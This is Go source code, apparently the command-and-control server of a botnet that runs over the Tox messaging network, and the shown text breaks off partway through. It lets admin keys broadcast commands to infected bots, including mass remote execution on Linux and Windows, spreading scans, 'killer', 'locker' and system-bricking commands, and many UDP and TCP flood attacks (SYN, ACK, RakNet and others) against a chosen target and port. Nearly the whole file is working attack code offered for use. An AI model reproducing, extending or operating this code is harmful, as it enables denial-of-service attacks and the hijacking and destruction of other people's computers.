package main

import (
	"fmt"
	"strconv"
	"strings"
	"time"

	"github.com/0x4meliorate/toxnet/net"

	tox "github.com/TokTok/go-toxcore-c"
)

func main() {

	net.Usage()

	var t = net.Tox_instance

	net.Bootstrap()
	net.ToxWrite()
	net.ShowC2()

	t.CallbackFriendRequest(func(t *tox.Tox, friendId string, message string, userData interface{}) {
	    fmt.Println("\n[+] Incoming friend request from:", friendId)
	    fmt.Println("    Message:", message)
	    
	    senderNum, err := t.FriendAddNorequest(friendId)
	    if err != nil {
		fmt.Println("[-] Error: Failed to add incoming friend -", err)
	    } else {
		fmt.Println("[+] Successfully added friend! Bot number:", senderNum)
	    }
	    if senderNum < 100000 {
		net.ToxWrite()
	    }
	}, nil)

	t.CallbackFriendMessage(func(t *tox.Tox, senderNum uint32, message string, userData interface{}) {

		senderKey, err := t.FriendGetPublicKey(senderNum)
		if err != nil {
			fmt.Println(err)
			return
		}

		messages := strings.Fields(message)
		if len(messages) == 0 {
			return
		}

		// Check if sender is an admin
		isAdmin := false
		for _, admin := range net.Admins {
			if len(admin) >= 64 && senderKey == admin[0:64] {
				isAdmin = true
				break
			}
		}

		if isAdmin {
			cmd := strings.ToLower(messages[0])
			
			// ==================== HELP COMMANDS ====================
			if cmd == "help" {
				// Check if there's a second argument "atk"
				if len(messages) > 1 && strings.ToLower(messages[1]) == "atk" {
					net.AdminHelpAtk(senderNum)
				} else {
					net.AdminHelp(senderNum)
				}
			// ==================== BOT MANAGEMENT ====================
			} else if cmd == "list" {
				net.AdminList(senderNum)
			} else if cmd == "names" {
				net.AdminNames(senderNum)
			} else if cmd == "stats" {
				net.AdminStats(senderNum)
			} else if cmd == "exec" {
				net.AdminExec(senderKey, messages)
			} else if cmd == "mass" {
				net.AdminMass(senderNum, senderKey, messages)
			} else if cmd == "masslinux" {
				net.AdminMassLinux(senderNum, senderKey, messages)
			} else if cmd == "masswin" {
				net.AdminMassWin(senderNum, senderKey, messages)
			// ==================== SELF-REPLICATION ====================
			} else if cmd == "startscan" {
				if len(messages) >= 2 {
					botID, err := strconv.ParseUint(messages[1], 10, 32)
					if err == nil {
						t.FriendSendMessage(uint32(botID), "startscan")
						t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Start scan command sent to bot %d", botID))
					}
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, "startscan")
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Start scan command sent to %d bots", count))
				}
			} else if cmd == "stopscan" {
				if len(messages) >= 2 {
					botID, err := strconv.ParseUint(messages[1], 10, 32)
					if err == nil {
						t.FriendSendMessage(uint32(botID), "stopscan")
						t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop scan command sent to bot %d", botID))
					}
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, "stopscan")
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop scan command sent to %d bots", count))
				}
			// ==================== KILLER/LOCKER/BRICKER COMMANDS ====================
			} else if cmd == "startkiller" {
				if len(messages) >= 2 {
					botID, err := strconv.ParseUint(messages[1], 10, 32)
					if err == nil {
						t.FriendSendMessage(uint32(botID), "startkiller")
						t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Start killer command sent to bot %d", botID))
					}
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, "startkiller")
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Start killer command sent to %d bots", count))
				}
			} else if cmd == "stopkiller" {
				if len(messages) >= 2 {
					botID, err := strconv.ParseUint(messages[1], 10, 32)
					if err == nil {
						t.FriendSendMessage(uint32(botID), "stopkiller")
						t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop killer command sent to bot %d", botID))
					}
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, "stopkiller")
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop killer command sent to %d bots", count))
				}
			} else if cmd == "startlocker" {
				if len(messages) >= 2 {
					botID, err := strconv.ParseUint(messages[1], 10, 32)
					if err == nil {
						t.FriendSendMessage(uint32(botID), "startlocker")
						t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Start locker command sent to bot %d", botID))
					}
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, "startlocker")
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Start locker command sent to %d bots", count))
				}
			} else if cmd == "brick" {
				if len(messages) >= 2 {
					botID, err := strconv.ParseUint(messages[1], 10, 32)
					if err == nil {
						t.FriendSendMessage(uint32(botID), "brick")
						t.FriendSendMessage(senderNum, fmt.Sprintf("[⚠️] BRICK command sent to bot %d - THIS WILL DESTROY THE SYSTEM!", botID))
					}
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, "brick")
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[⚠️] BRICK command sent to %d bots - THIS WILL DESTROY THOSE SYSTEMS!", count))
				}
			// ==================== UDP ATTACKS ====================
			} else if cmd == "vse" {
				if len(messages) < 4 {
					net.AdminHelp(senderNum)
					return
				}
				target := messages[1]
				threads := messages[2]
				duration := messages[3]
				if len(messages) >= 5 {
					botID, _ := strconv.ParseUint(messages[4], 10, 32)
					t.FriendSendMessage(uint32(botID), fmt.Sprintf("vse %s %s %s", target, threads, duration))
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] VSE attack sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, fmt.Sprintf("vse %s %s %s", target, threads, duration))
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] VSE attack command sent to %d bots", count))
				}
			} else if cmd == "stopvse" {
				if len(messages) >= 2 {
					botID, _ := strconv.ParseUint(messages[1], 10, 32)
					t.FriendSendMessage(uint32(botID), "stopvse")
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop VSE command sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, "stopvse")
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop VSE command sent to %d bots", count))
				}
			} else if cmd == "udpts" {
				if len(messages) < 5 {
					net.AdminHelp(senderNum)
					return
				}
				target := messages[1]
				port := messages[2]
				threads := messages[3]
				duration := messages[4]
				if len(messages) >= 6 {
					botID, _ := strconv.ParseUint(messages[5], 10, 32)
					t.FriendSendMessage(uint32(botID), fmt.Sprintf("udpts %s %s %s %s", target, port, threads, duration))
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] UDPTS attack sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, fmt.Sprintf("udpts %s %s %s %s", target, port, threads, duration))
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] UDPTS attack command sent to %d bots", count))
				}
			} else if cmd == "stopudpts" {
				if len(messages) >= 2 {
					botID, _ := strconv.ParseUint(messages[1], 10, 32)
					t.FriendSendMessage(uint32(botID), "stopudpts")
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop UDPTS command sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, "stopudpts")
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop UDPTS command sent to %d bots", count))
				}
			// ==================== TCP ATTACKS ====================
			} else if cmd == "wra" {
				if len(messages) < 5 {
					net.AdminHelp(senderNum)
					return
				}
				target := messages[1]
				port := messages[2]
				threads := messages[3]
				duration := messages[4]
				if len(messages) >= 6 {
					botID, _ := strconv.ParseUint(messages[5], 10, 32)
					t.FriendSendMessage(uint32(botID), fmt.Sprintf("wra %s %s %s %s", target, port, threads, duration))
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] WRA attack sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, fmt.Sprintf("wra %s %s %s %s", target, port, threads, duration))
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] WRA attack command sent to %d bots", count))
				}
			} else if cmd == "stopwra" {
				if len(messages) >= 2 {
					botID, _ := strconv.ParseUint(messages[1], 10, 32)
					t.FriendSendMessage(uint32(botID), "stopwra")
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop WRA command sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, "stopwra")
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop WRA command sent to %d bots", count))
				}
			} else if cmd == "tcp_syn" {
				if len(messages) < 5 {
					net.AdminHelp(senderNum)
					return
				}
				target := messages[1]
				port := messages[2]
				threads := messages[3]
				duration := messages[4]
				if len(messages) >= 6 {
					botID, _ := strconv.ParseUint(messages[5], 10, 32)
					t.FriendSendMessage(uint32(botID), fmt.Sprintf("tcp_syn %s %s %s %s", target, port, threads, duration))
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] TCP SYN attack sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, fmt.Sprintf("tcp_syn %s %s %s %s", target, port, threads, duration))
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] TCP SYN attack command sent to %d bots", count))
				}
			} else if cmd == "stop_tcp_syn" {
				if len(messages) >= 2 {
					botID, _ := strconv.ParseUint(messages[1], 10, 32)
					t.FriendSendMessage(uint32(botID), "stop_tcp_syn")
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop TCP SYN command sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, "stop_tcp_syn")
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop TCP SYN command sent to %d bots", count))
				}
			} else if cmd == "tcp_ack" {
				if len(messages) < 6 {
					net.AdminHelp(senderNum)
					return
				}
				target := messages[1]
				port := messages[2]
				threads := messages[3]
				duration := messages[4]
				length := messages[5]
				if len(messages) >= 7 {
					botID, _ := strconv.ParseUint(messages[6], 10, 32)
					t.FriendSendMessage(uint32(botID), fmt.Sprintf("tcp_ack %s %s %s %s %s", target, port, threads, duration, length))
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] TCP ACK attack sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, fmt.Sprintf("tcp_ack %s %s %s %s %s", target, port, threads, duration, length))
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] TCP ACK attack command sent to %d bots", count))
				}
			} else if cmd == "stop_tcp_ack" {
				if len(messages) >= 2 {
					botID, _ := strconv.ParseUint(messages[1], 10, 32)
					t.FriendSendMessage(uint32(botID), "stop_tcp_ack")
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop TCP ACK command sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, "stop_tcp_ack")
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop TCP ACK command sent to %d bots", count))
				}
			} else if cmd == "tcp_socket" {
				if len(messages) < 5 {
					net.AdminHelp(senderNum)
					return
				}
				target := messages[1]
				port := messages[2]
				threads := messages[3]
				duration := messages[4]
				if len(messages) >= 6 {
					botID, _ := strconv.ParseUint(messages[5], 10, 32)
					t.FriendSendMessage(uint32(botID), fmt.Sprintf("tcp_socket %s %s %s %s", target, port, threads, duration))
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] TCP Socket attack sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, fmt.Sprintf("tcp_socket %s %s %s %s", target, port, threads, duration))
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] TCP Socket attack command sent to %d bots", count))
				}
			} else if cmd == "stop_tcp_socket" {
				if len(messages) >= 2 {
					botID, _ := strconv.ParseUint(messages[1], 10, 32)
					t.FriendSendMessage(uint32(botID), "stop_tcp_socket")
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop TCP Socket command sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, "stop_tcp_socket")
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop TCP Socket command sent to %d bots", count))
				}
			} else if cmd == "tcp_bypass" {
				if len(messages) < 6 {
					net.AdminHelp(senderNum)
					return
				}
				target := messages[1]
				port := messages[2]
				threads := messages[3]
				duration := messages[4]
				length := messages[5]
				if len(messages) >= 7 {
					botID, _ := strconv.ParseUint(messages[6], 10, 32)
					t.FriendSendMessage(uint32(botID), fmt.Sprintf("tcp_bypass %s %s %s %s %s", target, port, threads, duration, length))
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] TCP Bypass attack sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, fmt.Sprintf("tcp_bypass %s %s %s %s %s", target, port, threads, duration, length))
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] TCP Bypass attack command sent to %d bots", count))
				}
			} else if cmd == "stop_tcp_bypass" {
				if len(messages) >= 2 {
					botID, _ := strconv.ParseUint(messages[1], 10, 32)
					t.FriendSendMessage(uint32(botID), "stop_tcp_bypass")
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop TCP Bypass command sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, "stop_tcp_bypass")
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop TCP Bypass command sent to %d bots", count))
				}
			} else if cmd == "tcp_syndata" {
				if len(messages) < 6 {
					net.AdminHelp(senderNum)
					return
				}
				target := messages[1]
				port := messages[2]
				threads := messages[3]
				duration := messages[4]
				length := messages[5]
				if len(messages) >= 7 {
					botID, _ := strconv.ParseUint(messages[6], 10, 32)
					t.FriendSendMessage(uint32(botID), fmt.Sprintf("tcp_syndata %s %s %s %s %s", target, port, threads, duration, length))
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] TCP SYN Data attack sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, fmt.Sprintf("tcp_syndata %s %s %s %s %s", target, port, threads, duration, length))
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] TCP SYN Data attack command sent to %d bots", count))
				}
			} else if cmd == "stop_tcp_syndata" {
				if len(messages) >= 2 {
					botID, _ := strconv.ParseUint(messages[1], 10, 32)
					t.FriendSendMessage(uint32(botID), "stop_tcp_syndata")
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop TCP SYN Data command sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, "stop_tcp_syndata")
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop TCP SYN Data command sent to %d bots", count))
				}
			} else if cmd == "tcp_stomp" {
				if len(messages) < 6 {
					net.AdminHelp(senderNum)
					return
				}
				target := messages[1]
				port := messages[2]
				threads := messages[3]
				duration := messages[4]
				length := messages[5]
				if len(messages) >= 7 {
					botID, _ := strconv.ParseUint(messages[6], 10, 32)
					t.FriendSendMessage(uint32(botID), fmt.Sprintf("tcp_stomp %s %s %s %s %s", target, port, threads, duration, length))
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] TCP Stomp attack sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, fmt.Sprintf("tcp_stomp %s %s %s %s %s", target, port, threads, duration, length))
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] TCP Stomp attack command sent to %d bots", count))
				}
			} else if cmd == "stop_tcp_stomp" {
				if len(messages) >= 2 {
					botID, _ := strconv.ParseUint(messages[1], 10, 32)
					t.FriendSendMessage(uint32(botID), "stop_tcp_stomp")
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop TCP Stomp command sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, "stop_tcp_stomp")
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop TCP Stomp command sent to %d bots", count))
				}
			} else if cmd == "tcp_socket_hold" {
				if len(messages) < 5 {
					net.AdminHelp(senderNum)
					return
				}
				target := messages[1]
				port := messages[2]
				threads := messages[3]
				duration := messages[4]
				if len(messages) >= 6 {
					botID, _ := strconv.ParseUint(messages[5], 10, 32)
					t.FriendSendMessage(uint32(botID), fmt.Sprintf("tcp_socket_hold %s %s %s %s", target, port, threads, duration))
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] TCP Socket Hold attack sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, fmt.Sprintf("tcp_socket_hold %s %s %s %s", target, port, threads, duration))
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] TCP Socket Hold attack command sent to %d bots", count))
				}
			} else if cmd == "stop_tcp_socket_hold" {
				if len(messages) >= 2 {
					botID, _ := strconv.ParseUint(messages[1], 10, 32)
					t.FriendSendMessage(uint32(botID), "stop_tcp_socket_hold")
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop TCP Socket Hold command sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, "stop_tcp_socket_hold")
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop TCP Socket Hold command sent to %d bots", count))
				}
			} else if cmd == "brazilian" {
				if len(messages) < 6 {
					net.AdminHelp(senderNum)
					return
				}
				target := messages[1]
				port := messages[2]
				threads := messages[3]
				duration := messages[4]
				length := messages[5]
				if len(messages) >= 7 {
					botID, _ := strconv.ParseUint(messages[6], 10, 32)
					t.FriendSendMessage(uint32(botID), fmt.Sprintf("brazilian %s %s %s %s %s", target, port, threads, duration, length))
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Brazilian attack sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, fmt.Sprintf("brazilian %s %s %s %s %s", target, port, threads, duration, length))
								count++
								}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Brazilian attack command sent to %d bots", count))
				}
			} else if cmd == "stop_brazilian" {
				if len(messages) >= 2 {
					botID, _ := strconv.ParseUint(messages[1], 10, 32)
					t.FriendSendMessage(uint32(botID), "stop_brazilian")
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop Brazilian command sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, "stop_brazilian")
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop Brazilian command sent to %d bots", count))
				}
			// ==================== UDP OTHER ATTACKS ====================
			} else if cmd == "raknet" {
				if len(messages) < 5 {
					net.AdminHelp(senderNum)
					return
				}
				target := messages[1]
				port := messages[2]
				threads := messages[3]
				duration := messages[4]
				if len(messages) >= 6 {
					botID, _ := strconv.ParseUint(messages[5], 10, 32)
					t.FriendSendMessage(uint32(botID), fmt.Sprintf("raknet %s %s %s %s", target, port, threads, duration))
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] RakNet attack sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, fmt.Sprintf("raknet %s %s %s %s", target, port, threads, duration))
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] RakNet attack command sent to %d bots", count))
				}
			} else if cmd == "stop_raknet" {
				if len(messages) >= 2 {
					botID, _ := strconv.ParseUint(messages[1], 10, 32)
					t.FriendSendMessage(uint32(botID), "stop_raknet")
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop RakNet command sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
